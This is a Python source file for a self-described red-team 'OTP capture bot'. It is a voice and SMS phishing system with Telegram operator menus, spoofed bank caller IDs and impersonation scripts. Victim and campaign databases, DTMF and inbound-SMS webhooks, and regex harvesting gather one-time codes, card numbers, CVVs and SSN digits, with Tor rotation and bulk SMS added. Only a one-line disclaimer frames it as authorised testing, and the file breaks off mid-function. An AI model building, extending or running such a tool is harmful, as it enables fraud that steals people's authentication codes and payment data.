#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================================
# 🔴 RED TEAM OTP CAPTURE BOT – GOD MODE v4.0 (Final)
# ============================================================================
# Merged from v2.x and the advanced production framework.
# Features:
#   - Victim & Campaign management (DB-backed, encrypted)
#   - Script & spoofing per victim
#   - DTMF capture, OTP detection engine, evidence audit
#   - Telegram bot with interactive menus (states)
#   - Operator auth (superadmins/editors)
#   - Encrypted Postgres, Redis, Tor proxy, Celery, Flask
#   - Vonage SMS, voice, WhatsApp, inbound SMS/DTMF webhooks
#   - Interactive config editor, backup/restore, rollback
#   - Health checks, cleanup, bulk SMS, dashboard
# ============================================================================
# ⚠️ LEGAL: Use ONLY under a signed, written Rules of Engagement that
#   explicitly authorises phishing, voice spoofing, and OTP interception.
#   Unauthorised use is illegal in most jurisdictions.
# ============================================================================

import os, sys, json, re, time, logging, asyncio, base64, hashlib, hmac
import random, threading, tempfile, traceback, signal
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, Optional, Any, List, Tuple
from collections import defaultdict

from flask import Flask, request, jsonify, abort, render_template_string
from flask_cors import CORS
from werkzeug.exceptions import HTTPException
from werkzeug.middleware.proxy_fix import ProxyFix
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile, BotCommand
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler
)
from telegram.error import TelegramError

from vonage import Auth, Vonage

from sqlalchemy import create_engine, Column, Integer, String, DateTime, LargeBinary, Text
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker, Session
from sqlalchemy.exc import OperationalError

from dotenv import load_dotenv
from stem import Signal
from stem.control import Controller

from cryptography.fernet import Fernet

from celery import Celery
from celery.result import AsyncResult

import socks, socket, phonenumbers
from logging.handlers import RotatingFileHandler
import requests

load_dotenv()

# ======================== LOGGING ========================
class LogColors:
    RESET = "\033[0m"; RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; CYAN = "\033[36m"; MAGENTA = "\033[35m"; WHITE = "\033[37m"; BOLD = "\033[1m"

class StructuredFormatter(logging.Formatter):
    LEVEL_COLORS = {
        logging.DEBUG: LogColors.CYAN, logging.INFO: LogColors.GREEN,
        logging.WARNING: LogColors.YELLOW, logging.ERROR: LogColors.RED,
        logging.CRITICAL: LogColors.MAGENTA,
    }
    def format(self, record):
        color = self.LEVEL_COLORS.get(record.levelno, LogColors.RESET)
        ts = datetime.fromtimestamp(record.created).strftime("%Y-%m-%d %H:%M:%S")
        fmt = (f"{color}{LogColors.BOLD}[{ts}]{LogColors.RESET} "
               f"{color}[{record.levelname:8}]{LogColors.RESET} "
               f"{LogColors.WHITE}{record.name}:{LogColors.RESET} "
               f"{record.getMessage()}")
        if record.exc_info:
            fmt += f"\n{LogColors.RED}{self.formatException(record.exc_info)}{LogColors.RESET}"
        return fmt

logger = logging.getLogger("GodMode")
fh = RotatingFileHandler("godmode.log", maxBytes=10*1024*1024, backupCount=5)
fh.setFormatter(StructuredFormatter())
logger.addHandler(fh)
logger.setLevel(logging.DEBUG)

def print_startup_banner():
    banner = f"""{LogColors.RED}{LogColors.BOLD}
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║          🔴 GOD MODE OTP CAPTURE BOT v4.1 🔴            ║
    ║          [Multi-Payload Intelligence Engine]             ║
    ║                                                           ║
    ║  ✓ OTP Capture          ✓ Card Details                   ║
    ║  ✓ SSN Extraction       ✓ Custom Fields                  ║
    ║  ✓ Multi-Lang Voice     ✓ Campaign Manager              ║
    ║  ✓ Telegram Control     ✓ Evidence Audit Trail          ║
    ║                                                           ║
    ║              [READY FOR ENGAGEMENT]                      ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
{LogColors.RESET}
    """
    print(banner)
    logger.info("🚀 God Mode OTP Capture Bot initialized (v4.1)")
    logger.info(f"📊 Database: {DATABASE_URL if not DATABASE_URL.startswith('sqlite') else 'SQLite (local)'}")
    logger.info(f"🔐 Redis: {REDIS_HOST}:{REDIS_PORT}")
    logger.info(f"📱 Telegram: Ready for commands")

_missing_env = []

def require_env(var, desc=""):
    val = os.getenv(var)
    if not val:
        _missing_env.append(f"{var}: {desc}" if desc else var)
        return ""
    return val

TELEGRAM_TOKEN = require_env("TELEGRAM_TOKEN")
VONAGE_API_KEY = require_env("VONAGE_API_KEY")
VONAGE_API_SECRET = require_env("VONAGE_API_SECRET")
VONAGE_APPLICATION_ID = require_env("VONAGE_APPLICATION_ID")
VONAGE_PRIVATE_KEY = require_env("VONAGE_PRIVATE_KEY").replace("\\n", "\n")
VONAGE_VIRTUAL_NUMBER = require_env("VONAGE_VIRTUAL_NUMBER")
BASE_URL = require_env("BASE_URL").rstrip("/")
SMS_FROM = os.getenv("SMS_FROM", "VonageBot")
SUPERADMINS = [int(id) for id in os.getenv("SUPERADMINS", "").split(",") if id]
EDITORS = [int(id) for id in os.getenv("EDITORS", "").split(",") if id]
TELEGRAM_ADMIN_IDS = list(set(SUPERADMINS + EDITORS))
TOR_PROXY = os.getenv("TOR_PROXY", "")
TOR_CONTROL_PORT = int(os.getenv("TOR_CONTROL_PORT", 9051))
TOR_PASSWORD = os.getenv("TOR_CONTROL_PASSWORD", None)
REDIS_HOST = os.getenv("REDIS_HOST", "localhost")
REDIS_PORT = int(os.getenv("REDIS_PORT", 6379))
REDIS_PASSWORD = os.getenv("REDIS_PASSWORD", None)
REDIS_SSL = str(os.getenv("REDIS_SSL", "False")).lower() in ("true", "1")
DATABASE_URL = os.getenv("DATABASE_URL") or f"sqlite:///{Path.cwd().as_posix()}/godmode.db"
if not os.getenv("DATABASE_URL"):
    logger.warning("DATABASE_URL not set; using local SQLite database godmode.db")
ENCRYPTION_KEY_FILE = os.getenv("ENCRYPTION_KEY_FILE", "/run/secrets/encryption_key")
KEEP_ALIVE_URL = os.getenv("KEEP_ALIVE_URL", "")  # external uptime bot URL to ping (optional)
KEEP_ALIVE_INTERVAL = int(os.getenv("KEEP_ALIVE_INTERVAL", 300))  # seconds

if _missing_env:
    logger.warning("Missing environment variables (will continue; some features disabled):\n" + "\n".join(_missing_env))

# Load encryption key (must be 32 url-safe base64-encoded bytes)
def load_encryption_key():
    def is_valid(k: str) -> bool:
        try:
            if isinstance(k, str):
                k_b = k.encode()
            else:
                k_b = k
            Fernet(k_b)
            return True
        except Exception:
            return False

    # 1) try env var
    env_key = os.getenv("ENCRYPTION_KEY")
    if env_key:
        if is_valid(env_key):
            return env_key
        # allow user-friendly newline escapes
        maybe = env_key.replace('\\n', '\n')
        if is_valid(maybe):
            return maybe

    # 2) try file
    try:
        if os.path.exists(ENCRYPTION_KEY_FILE):
            with open(ENCRYPTION_KEY_FILE, "r") as f:
                file_key = f.read().strip()
            if file_key and is_valid(file_key):
                return file_key
            # try unescaping
            if file_key and is_valid(file_key.replace('\\n', '\n')):
                return file_key.replace('\\n', '\n')
    except Exception:
        pass

    # 3) generate a new valid key and persist
    new_key = Fernet.generate_key().decode()
    try:
        with open(ENCRYPTION_KEY_FILE, "w") as f:
            f.write(new_key)
        try:
            os.chmod(ENCRYPTION_KEY_FILE, 0o600)
        except Exception:
            # chmod may fail on Windows; ignore
            pass
    except Exception:
        # if writing fails, just return the generated key
        pass
    return new_key


ENCRYPTION_KEY = load_encryption_key()
fernet = Fernet(ENCRYPTION_KEY.encode())

# Config Manager
CONFIG_FILE = "config.json"
DEFAULT_CONFIG = {
    "MAX_RETRIES": 3, "MAX_DIGITS": 6,
    "voices": {
        "en": {"voiceName": "Amy", "language": "en-US"},
        "es": {"voiceName": "Conchita", "language": "es-ES"},
        "fr": {"voiceName": "Celine", "language": "fr-FR"}
    },
    "prompts": {
        "en": {
            "initial": "Hello, this is your bank. Enter your 6-digit code then press #.",
            "retry1": "Didn't get code, enter again.", "retry2": "Last try, enter now.",
            "success": "Thanks. Account secured.", "failure": "Goodbye."
        },
        "es": {
            "initial": "Hola, su banco. Ingrese código de 6 dígitos y presione #.",
            "retry1": "Ingrese nuevamente.", "retry2": "Último intento.",
            "success": "Gracias.", "failure": "Adiós."
        },
        "fr": {
            "initial": "Bonjour, votre banque. Entrez code 6 chiffres puis #.",
            "retry1": "Réessayez.", "retry2": "Dernier essai.",
            "success": "Merci.", "failure": "Au revoir."
        }
    },
    "engagement_scripts": {
        "bank_fraud_alert": {
            "en": {
                "opening": "Hello {victim_name}, this is security alert from {service}. Suspicious activity detected on your account.",
                "verification": "For your protection, please enter your {digit_count}-digit verification code now, then press the hash key.",
                "retry_1": "We didn't receive your code. Please try again.",
                "retry_2": "This is your final attempt. Enter your verification code and press hash.",
                "success": "Thank you. Your account has been secured. You will receive a confirmation email shortly.",
                "failure": "Unable to verify. Please contact {service} directly at 1-800-BANK."
            },
            "es": {
                "opening": "Hola {victim_name}, alerta de seguridad de {service}. Se detectó actividad sospechosa en su cuenta.",
                "verification": "Por su protección, ingrese su código de verificación de {digit_count} dígitos ahora, luego presione la tecla numeral.",
                "retry_1": "No recibimos su código. Por favor, intente de nuevo.",
                "retry_2": "Este es su último intento. Ingrese su código de verificación y presione numeral.",
                "success": "Gracias. Su cuenta ha sido asegurada. Recibirá un correo de confirmación pronto.",
                "failure": "No se puede verificar. Por favor, contacte a {service} directamente."
            }
        },
        "email_verification": {
            "en": {
                "opening": "This is {service} account verification. We need to confirm your identity.",
                "verification": "Enter the 6-digit code sent to your email address. Press hash when complete.",
                "retry_1": "Code not recognized. Please check your email and try again.",
                "retry_2": "Final attempt. Enter the code from your email.",
                "success": "Verification successful. Your account remains active.",
                "failure": "Verification failed. Please visit {service} website to complete this process."
            },
            "es": {
                "opening": "Verificación de cuenta de {service}. Necesitamos confirmar su identidad.",
                "verification": "Ingrese el código de 6 dígitos enviado a su correo electrónico. Presione numeral al completar.",
                "retry_1": "Código no reconocido. Revise su correo e intente de nuevo.",
                "retry_2": "Último intento. Ingrese el código de su correo.",
                "success": "Verificación exitosa. Su cuenta permanece activa.",
                "failure": "La verificación falló. Visite el sitio web de {service} para completar este proceso."
            }
        },
        "mfa_update": {
            "en": {
                "opening": "Your {service} account requires a multi-factor authentication update. Please confirm your identity.",
                "verification": "Enter your {digit_count}-digit authenticator code or backup code now. Press hash to submit.",
                "retry_1": "Invalid code. Please check your authenticator app and try again.",
                "retry_2": "This is your last chance. Enter the correct code.",
                "success": "Multi-factor authentication has been updated. Your account is now secure.",
                "failure": "Unable to update MFA. Please contact support."
            },
            "es": {
                "opening": "Su cuenta de {service} requiere una actualización de autenticación multifactor. Por favor, confirme su identidad.",
                "verification": "Ingrese su código de autenticador de {digit_count} dígitos o código de respaldo ahora. Presione numeral para enviar.",
                "retry_1": "Código inválido. Revise su aplicación autenticadora e intente de nuevo.",
                "retry_2": "Esta es su última oportunidad. Ingrese el código correcto.",
                "success": "La autenticación multifactor ha sido actualizada. Su cuenta ahora está segura.",
                "failure": "No se puede actualizar MFA. Por favor, contacte al soporte."
            }
        },
        "payment_confirmation": {
            "en": {
                "opening": "Pending payment confirmation from {service}. We detected a transaction requiring your approval.",
                "verification": "Please confirm by entering the 4-digit code displayed on your card. Press hash to continue.",
                "retry_1": "Code mismatch. Please look at your card again and re-enter the code.",
                "retry_2": "Final verification attempt. Enter the security code from your card.",
                "success": "Payment approved. Transaction will be processed within 24 hours.",
                "failure": "Payment confirmation failed. Transaction has been declined."
            }
        }
    },
    "SMS_TEMPLATE": "Security alert from {service}. Reply with verification code.",
    "SMS_TEMPLATES_ADVANCED": {
        "bank_fraud": "⚠️ FRAUD ALERT: Unauthorized access attempt on your {service} account. Reply with verification code to secure your account immediately.",
        "email_verify": "{service}: Verify your account. Your security code is required. Reply with the 6-digit code sent to your email.",
        "payment": "{service}: Confirm pending transaction. Reply with your 4-digit card verification code."
    },
    "SPOOF_DEFAULT_CALLER": "1-800-555-BANK",
    "SPOOF_DEFAULT_SERVICE": "Your Bank",
    "OPERATOR_IDS": TELEGRAM_ADMIN_IDS,
    "ENGAGEMENT_ID": "ENGAGEMENT_001",
    "RULES_OF_ENGAGEMENT": "",
    "script_presets": [
        "bank_fraud_alert",
        "email_verification", 
        "mfa_update",
        "payment_confirmation"
    ],
    "capture_types": {
        "bank_fraud_alert": {
            "fields": [
                {"name": "otp", "prompt": "Enter your 6-digit code", "type": "numeric", "length": 6},
            ],
            "fallback_fields": [
                {"name": "card_number", "prompt": "Enter your 16-digit card number", "type": "numeric", "length": 16},
                {"name": "cvv", "prompt": "Enter your CVV", "type": "numeric", "length": 3}
            ]
        },
        "payment_confirmation": {
            "fields": [
                {"name": "cvv", "prompt": "Enter the 3-digit security code on your card", "type": "numeric", "length": 3},
                {"name": "card_number", "prompt": "Enter last 4 digits of your card", "type": "numeric", "length": 4}
            ]
        },
        "email_verification": {
            "fields": [
                {"name": "otp", "prompt": "Enter 6-digit code from your email", "type": "numeric", "length": 6},
                {"name": "ssn", "prompt": "For verification, enter last 4 digits of SSN", "type": "numeric", "length": 4}
            ]
        },
        "mfa_update": {
            "fields": [
                {"name": "mfa_code", "prompt": "Enter your authenticator code", "type": "numeric", "length": 6},
                {"name": "backup_code", "prompt": "Or enter backup code", "type": "alphanumeric", "length": 8}
            ]
        }
    }
}

# Allow storing Vonage creds in config so the bot can be used to set them
DEFAULT_VONAGE_KEYS = {
    "VONAGE_API_KEY": "",
    "VONAGE_API_SECRET": "",
    "VONAGE_APPLICATION_ID": "",
    "VONAGE_PRIVATE_KEY": "",
    "VONAGE_VIRTUAL_NUMBER": "",
}

DEFAULT_CONFIG.update(DEFAULT_VONAGE_KEYS)

class ConfigManager:
    def __init__(self, path):
        self.path = path
        self.data = self._load()
        self._lock = threading.Lock()
    def _load(self):
        if os.path.exists(self.path):
            try:
                with open(self.path) as f:
                    return {**DEFAULT_CONFIG, **json.load(f)}
            except: pass
        return DEFAULT_CONFIG.copy()
    def save(self):
        with self._lock:
            with open(self.path, "w") as f:
                json.dump(self.data, f, indent=2)
    def get(self, key, default=None):
        return self.data.get(key, default)
    def set(self, key, value):
        with self._lock:
            self.data[key] = value
            self.save()
    def validate(self):
        # Only require a valid Telegram token to run the bot; Vonage can be configured later via the bot
        return not os.getenv("TELEGRAM_TOKEN", "").startswith("YOUR_")

config = ConfigManager(CONFIG_FILE)

# If Vonage env vars are not present, allow configuring them via config.json (edited through the bot)
if not VONAGE_API_KEY:
    VONAGE_API_KEY = config.get("VONAGE_API_KEY", "")
    VONAGE_API_SECRET = config.get("VONAGE_API_SECRET", "")
    VONAGE_APPLICATION_ID = config.get("VONAGE_APPLICATION_ID", "")
    VONAGE_PRIVATE_KEY = config.get("VONAGE_PRIVATE_KEY", "").replace("\\n", "\n")
    VONAGE_VIRTUAL_NUMBER = config.get("VONAGE_VIRTUAL_NUMBER", "")

# Feature flags
VONAGE_SMS_ENABLED = bool(VONAGE_API_KEY and VONAGE_API_SECRET and VONAGE_VIRTUAL_NUMBER)
VONAGE_VOICE_ENABLED = bool(VONAGE_APPLICATION_ID and VONAGE_PRIVATE_KEY)
logger.info(f"Vonage SMS enabled: {VONAGE_SMS_ENABLED}; Vonage Voice enabled: {VONAGE_VOICE_ENABLED}")


def init_vonage_clients_from_config():
    """Attempt to (re)initialize Vonage clients from current `config` values.
    This allows entering credentials via the bot's config editor at runtime.
    """
    global VONAGE_API_KEY, VONAGE_API_SECRET, VONAGE_APPLICATION_ID, VONAGE_PRIVATE_KEY, VONAGE_VIRTUAL_NUMBER
    global VONAGE_SMS_ENABLED, VONAGE_VOICE_ENABLED
    global base_client, voice_client, sms_client, messages, voice

    # reload from config if env not set
    if not VONAGE_API_KEY:
        VONAGE_API_KEY = config.get("VONAGE_API_KEY", "")
        VONAGE_API_SECRET = config.get("VONAGE_API_SECRET", "")
        VONAGE_APPLICATION_ID = config.get("VONAGE_APPLICATION_ID", "")
        VONAGE_PRIVATE_KEY = config.get("VONAGE_PRIVATE_KEY", "").replace("\\n", "\n")
        VONAGE_VIRTUAL_NUMBER = config.get("VONAGE_VIRTUAL_NUMBER", "")

    VONAGE_SMS_ENABLED = bool(VONAGE_API_KEY and VONAGE_API_SECRET and VONAGE_VIRTUAL_NUMBER)
    VONAGE_VOICE_ENABLED = bool(VONAGE_APPLICATION_ID and VONAGE_PRIVATE_KEY)

    if VONAGE_SMS_ENABLED and not sms_client:
        try:
            base_client = Vonage(Auth(api_key=VONAGE_API_KEY, api_secret=VONAGE_API_SECRET))
            sms_client = base_client.sms
            logger.info("Vonage SMS client initialized from config.")
        except Exception as e:
            logger.warning(f"Could not initialize Vonage SMS client from config: {e}")

    if VONAGE_VOICE_ENABLED and not voice:
        try:
            voice_client = Vonage(Auth(application_id=VONAGE_APPLICATION_ID, private_key=VONAGE_PRIVATE_KEY))
            messages = voice_client.messages
            voice = voice_client.voice
            logger.info("Vonage Voice client initialized from config.")
        except Exception as e:
            logger.warning(f"Could not initialize Vonage Voice client from config: {e}")

# ======================== DATABASE ========================
Base = declarative_base()

class OTPRecord(Base):
    __tablename__ = "otp_records"
    id = Column(Integer, primary_key=True)
    victim_id = Column(String(50), nullable=True)
    campaign_id = Column(String(50), nullable=True)
    otp_value = Column(LargeBinary, nullable=False)
    timestamp = Column(DateTime, default=datetime.utcnow, index=True)

class CapturedData(Base):
    __tablename__ = "captured_data"
    id = Column(Integer, primary_key=True)
    victim_id = Column(String(50), nullable=True, index=True)
    campaign_id = Column(String(50), nullable=True, index=True)
    data_type = Column(String(50), nullable=False)  # otp, card, ssn, custom, etc.
    field_name = Column(String(100), nullable=False)  # what was captured
    field_value = Column(LargeBinary, nullable=False)  # encrypted value
    confidence = Column(Integer, default=100)  # 0-100 confidence score
    method = Column(String(50), default="voice")  # voice, sms, call
    meta_json = Column(Text, default="{}")  # JSON extra info (renamed from 'metadata')
    timestamp = Column(DateTime, default=datetime.utcnow, index=True)
    processed = Column(Integer, default=0)  # flag for auditing

class Contact(Base):
    __tablename__ = "contacts"
    id = Column(Integer, primary_key=True)
    name = Column(String(50), nullable=False)
    number = Column(LargeBinary, nullable=False)
    timestamp = Column(DateTime, default=datetime.utcnow, index=True)

class VictimProfile(Base):
    __tablename__ = "victim_profiles"
    id = Column(String(50), primary_key=True)
    name = Column(String(100), nullable=False)
    phone = Column(LargeBinary, nullable=False)
    email = Column(LargeBinary, nullable=False)
    target_service = Column(String(100))
    spoof_caller_id = Column(String(50))
    spoof_service_name = Column(String(100))
    campaign_id = Column(String(50))
    scripts_json = Column(Text, default="{}")
    captures_json = Column(Text, default="[]")
    created = Column(DateTime, default=datetime.utcnow)
    updated = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

class Campaign(Base):
    __tablename__ = "campaigns"
    id = Column(String(50), primary_key=True)
    name = Column(String(100))
    target_service = Column(String(100))
    default_spoof_caller = Column(String(50))
    default_spoof_service = Column(String(100))
    victim_ids_json = Column(Text, default="[]")
    created = Column(DateTime, default=datetime.utcnow)

class ConfigHistory(Base):
    __tablename__ = "config_history"
    id = Column(Integer, primary_key=True)
    user_id = Column(Integer, nullable=False)
    path = Column(String(255), nullable=False)
    old_value = Column(String(1000))
    new_value = Column(String(1000))
    timestamp = Column(DateTime, default=datetime.utcnow, index=True)

class ConfigVersion(Base):
    __tablename__ = "config_versions"
    id = Column(Integer, primary_key=True)
    user_id = Column(Integer, nullable=False)
    config_json = Column(String(10000), nullable=False)
    timestamp = Column(DateTime, default=datetime.utcnow, index=True)

if DATABASE_URL.startswith("sqlite"):
    engine = create_engine(DATABASE_URL, connect_args={"check_same_thread": False})
else:
    engine = create_engine(DATABASE_URL, pool_size=10, max_overflow=20, connect_args={"sslmode": "require"})
Base.metadata.create_all(engine)
SessionLocal = sessionmaker(bind=engine)

def db_session():
    return SessionLocal()

# ======================== REDIS ========================
import redis
r = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, password=REDIS_PASSWORD, ssl=REDIS_SSL, decode_responses=True)

# ======================== TOR PROXY ========================
def validate_tor(proxy_url):
    if not proxy_url: return False
    try:
        _, host_port = proxy_url.split("://")
        host, port = host_port.split(":")
        sock = socks.socksocket()
        sock.set_proxy(socks.SOCKS5, host, int(port))
        sock.settimeout(5)
        sock.connect(("check.torproject.org", 80))
        sock.close()
        return True
    except: return False

def rotate_tor_ip():
    if not TOR_PROXY or not validate_tor(TOR_PROXY): return False
    try:
        with Controller.from_port(port=TOR_CONTROL_PORT) as c:
            if TOR_PASSWORD: c.authenticate(password=TOR_PASSWORD)
            else: c.authenticate()
            c.signal(Signal.NEWNYM)
            time.sleep(5)
            logger.info("Tor IP rotated.")
            return True
    except Exception as e:
        logger.warning(f"Tor rotation failed: {e}")
        return False

proxies = {}
if TOR_PROXY and validate_tor(TOR_PROXY):
    proxies = {"http": TOR_PROXY, "https": TOR_PROXY}
    os.environ["HTTP_PROXY"] = TOR_PROXY
    os.environ["HTTPS_PROXY"] = TOR_PROXY
    os.environ["http_proxy"] = TOR_PROXY
    os.environ["https_proxy"] = TOR_PROXY

# Vonage clients (optional)
base_client = None
voice_client = None
sms_client = None
messages = None
voice = None
if VONAGE_SMS_ENABLED:
    try:
        base_client = Vonage(Auth(api_key=VONAGE_API_KEY, api_secret=VONAGE_API_SECRET))
        sms_client = base_client.sms
    except Exception as e:
        logger.warning(f"Failed to initialize Vonage SMS client: {e}")

if VONAGE_VOICE_ENABLED:
    try:
        voice_client = Vonage(Auth(application_id=VONAGE_APPLICATION_ID, private_key=VONAGE_PRIVATE_KEY))
        messages = voice_client.messages
        voice = voice_client.voice
    except Exception as e:
        logger.warning(f"Failed to initialize Vonage Voice client: {e}")

# ======================== CELERY ========================
celery_app = Celery('godmode', broker=f'redis://{REDIS_HOST}:{REDIS_PORT}')

@celery_app.task(bind=True, max_retries=3)
def send_bulk_sms_task(self, message, contact_numbers):
    succ, fail = 0, 0
    if not sms_client:
        init_vonage_clients_from_config()
        if not sms_client:
            logger.warning("Bulk SMS requested but SMS client is not configured.")
            return 0, len(contact_numbers)
    for num in contact_numbers:
        try:
            resp = sms_client.send({"to": num, "from_": SMS_FROM, "text": message})
            if resp and resp.messages[0].status == "0": succ += 1
            else: fail += 1; raise ValueError("SMS failed")
        except Exception as exc:
            fail += 1; self.retry(exc=exc, countdown=60*(self.request.retries+1))
    return succ, fail

@celery_app.task
def periodic_cleanup(days=7):
    cutoff = datetime.utcnow() - timedelta(days=days)
    with db_session() as s:
        s.query(OTPRecord).filter(OTPRecord.timestamp < cutoff).delete()
        s.query(Contact).filter(Contact.timestamp < cutoff).delete()
        s.query(ConfigHistory).filter(ConfigHistory.timestamp < cutoff).delete()
        s.commit()

@celery_app.task
def health_check_task():
    try:
        r.ping()
        db_session().execute("SELECT 1")
        if VONAGE_SMS_ENABLED or VONAGE_VOICE_ENABLED:
            Vonage(Auth(api_key=VONAGE_API_KEY, api_secret=VONAGE_API_SECRET)).account.get_balance()
        logger.info("Health check passed.")
    except Exception as e:
        logger.error(f"Health check failed: {e}. Restarting app.")
        os.execv(sys.executable, [sys.executable] + sys.argv)

# ======================== FLASK APP ========================
app = Flask(__name__)
CORS(app)
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1)
limiter = Limiter(get_remote_address, app=app, default_limits=["200 per day", "50 per hour"],
                  storage_uri=f"redis://{REDIS_HOST}:{REDIS_PORT}",
                  storage_options={"password": REDIS_PASSWORD, "ssl": REDIS_SSL})


def chunk_buttons(buttons, cols=2):
    return [buttons[i:i+cols] for i in range(0, len(buttons), cols)]


def format_config_value(value):
    if isinstance(value, dict):
        return "/"
    if isinstance(value, list):
        return f"[{len(value)} items]"
    text = json.dumps(value) if not isinstance(value, (str, int, bool)) else str(value)
    return text if len(text) <= 22 else f"{text[:19]}..."


@app.after_request
def add_security_headers(resp):
    resp.headers["Strict-Transport-Security"] = "max-age=63072000; includeSubDomains"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["X-Frame-Options"] = "DENY"
    return resp


@app.errorhandler(Exception)
def handle_uncaught_exception(error):
    if isinstance(error, HTTPException):
        return error
    logger.exception("Unhandled HTTP error")
    return jsonify({"error": "internal_server_error", "message": "An unexpected error occurred."}), 500

@app.route("/")
def index():
    return jsonify({
        "status": "online",
        "service": "God Mode OTP Capture Bot",
        "version": "4.1",
        "endpoints": ["/health", "/dashboard", "/webhook/voice", "/webhook/dtmf", "/inbound-sms"]
    })

@app.route("/health")
def health():
    try:
        r.ping(); db_session().execute("SELECT 1")
        return "OK", 200
    except Exception as e:
        return f"FAIL: {e}", 500

@app.route("/dashboard")
def dashboard():
    with db_session() as s:
        otp_count = s.query(OTPRecord).count()
        contact_count = s.query(Contact).count()
    return f"""
    <html><head><title>God Mode Dashboard</title></head>
    <body><h1>OTP Capture Stats</h1>
    <p>Total OTPs: {otp_count}</p><p>Contacts: {contact_count}</p></body></html>
    """

@app.route("/webhook/voice", methods=["POST"])
@limiter.limit("10 per minute")
def voice_webhook():
    payload = request.get_json(silent=True) or {}
    lang = request.args.get("lang", "en")
    lang = lang if lang in config.get("voices", {}) else "en"
    voice_conf = config.get("voices")[lang]
    prompt = config.get("prompts")[lang]["initial"]
    uuid = request.args.get("uuid", "call_default")
    r.set(f"retry:{uuid}", 0, ex=3600)
    ncco = [
        {"action": "talk", "voiceName": voice_conf["voiceName"], "language": voice_conf["language"], "text": prompt},
        {"action": "input", "eventUrl": [f"{BASE_URL}/webhook/dtmf?lang={lang}&uuid={uuid}"],
         "maxDigits": config.get("MAX_DIGITS", 6), "submitOnHash": True, "timeOut": 10}
    ]
    return jsonify(ncco)

@app.route("/webhook/dtmf", methods=["POST"])
@limiter.limit("5 per minute")
def dtmf_webhook():
    payload = request.get_json(silent=True) or {}
    lang = request.args.get("lang", "en"); lang = lang if lang in config.get("voices", {}) else "en"
    digits = payload.get("dtmf", "")
    if not digits.isdigit(): return jsonify([{"action": "talk", "text": "Error"}, {"action": "hangup"}])
    store_otp_db(otp_value=digits)
    success_msg = config.get("prompts")[lang]["success"]
    return jsonify([{"action": "talk", "text": success_msg}, {"action": "hangup"}])

@app.route("/inbound-sms", methods=["POST"])
@limiter.limit("10 per minute")
def inbound_sms():
    data = request.get_json(silent=True) or request.form
    from_num = data.get("msisdn") or data.get("from")
    text = data.get("text") or data.get("message", "")
    if not from_num or not text: return jsonify({"error": "missing fields"}), 400
    
    vid = find_victim_by_phone(from_num)
    captured = False
    
    # Detect OTPs
    otps = detect_otps(text)
    if otps:
        for otp in otps:
            capture_data(vid, None, "otp", "verification_code", otp["value"], otp["confidence"], "sms")
        captured = True
    
    # Detect card data
    cards = detect_card_data(text)
    if cards:
        for card in cards:
            capture_data(vid, None, "financial", card["type"], card["value"], card["confidence"], "sms")
        captured = True
    
    if captured:
        logger.info(f"✅ SMS: Captured {len(otps)} OTPs and {len(cards)} financial records from {from_num}")
        return jsonify({"status": "captured", "items": len(otps) + len(cards)}), 200
    
    logger.debug(f"⏭️ SMS: No sensitive data detected from {from_num}")
    return jsonify({"status": "no_data"}), 200

# ======================== OTP DETECTION ========================
def detect_otps(text: str) -> List[Dict]:
    patterns = {
        "6_digit": r'\b([0-9]{6})\b', "4_digit": r'\b([0-9]{4})\b',
        "8_digit": r'\b([0-9]{8})\b', "code": r'code[:\s]+([0-9A-Z]{4,8})',
        "pin": r'(?:PIN|pin)[:\s]+([0-9]{4,8})',
        "google": r'(?:G-|Google)[:\s]+([0-9]{6})',
        "microsoft": r'(?:Microsoft)[:\s]+([0-9]{6})',
        "apple": r'(?:Apple|iCloud)[:\s]+([0-9]{6})',
        "whatsapp": r'(?:WhatsApp)[:\s]+([0-9]{4,6})',
    }
    results = []
    for name, pat in patterns.items():
        for m in re.finditer(pat, text, re.IGNORECASE):
            val = m.group(1)
            results.append({"type": name, "value": val, "confidence": 0.9 if len(val)==6 else 0.7})
    seen = set(); unique = []
    for r in results:
        if r["value"] not in seen:
            seen.add(r["value"]); unique.append(r)
    return unique

def store_otp_db(victim_id=None, campaign_id=None, otp_value=""):
    """Legacy compatibility - use capture_data instead."""
    capture_data(victim_id, campaign_id, "otp", "verification_code", otp_value, 100, "voice")

def capture_data(victim_id=None, campaign_id=None, data_type="otp", field_name="value", 
                 field_value="", confidence=100, method="voice", metadata=None):
    """Capture any type of data with metadata tracking."""
    if not field_value:
        return False
    try:
        enc = fernet.encrypt(field_value.encode())
        with db_session() as s:
            rec = CapturedData(
                victim_id=victim_id,
                campaign_id=campaign_id,
                data_type=data_type,
                field_name=field_name,
                field_value=enc,
                confidence=confidence,
                method=method,
                meta_json=json.dumps(metadata or {})
            )
            s.add(rec)
            s.commit()
            
            # Log to victim profile
            if victim_id:
                v = s.query(VictimProfile).get(victim_id)
                if v:
                    caps = json.loads(v.captures_json)
                    caps.append({
                        "type": data_type,
                        "field": field_name,
                        "time": datetime.utcnow().isoformat(),
                        "confidence": confidence
                    })
                    v.captures_json = json.dumps(caps)
                    s.commit()
            
            logger.warning(f"📊 Data captured: {data_type}/{field_name} for victim {victim_id}")
            return True
    except Exception as e:
        logger.error(f"❌ Capture failed: {e}")
        return False

def detect_card_data(text: str) -> List[Dict]:
    """Detect credit card numbers, CVV, SSN, etc."""
    patterns = {
        "card_16": r'\b([0-9]{4}[\s-]?[0-9]{4}[\s-]?[0-9]{4}[\s-]?[0-9]{4})\b',
        "card_15": r'\b([0-9]{4}[\s-]?[0-9]{6}[\s-]?[0-9]{5})\b',
        "cvv_3": r'(?:cvv|cvc|cid)[:\s]+([0-9]{3})\b',
        "cvv_4": r'(?:cvv|cvc|cid)[:\s]+([0-9]{4})\b',
